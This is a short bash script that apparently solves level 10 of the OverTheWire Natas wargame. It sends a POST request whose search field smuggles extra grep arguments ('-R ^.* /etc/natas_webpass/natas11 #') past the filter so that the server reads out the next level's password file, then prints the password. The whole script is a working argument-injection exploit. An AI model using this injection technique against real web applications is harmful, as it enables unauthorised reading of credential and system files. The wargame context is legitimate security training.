#!/bin/bash

BASIC=$(./natas9.sh)

PASSWORD=$(curl --user $BASIC --data "needle=-R ^.* /etc/natas_webpass/natas11 #&submit=Search" http://natas10.natas.labs.overthewire.org 2>/dev/null | grep /pre -B1 | head -1)

echo "natas11:$PASSWORD"
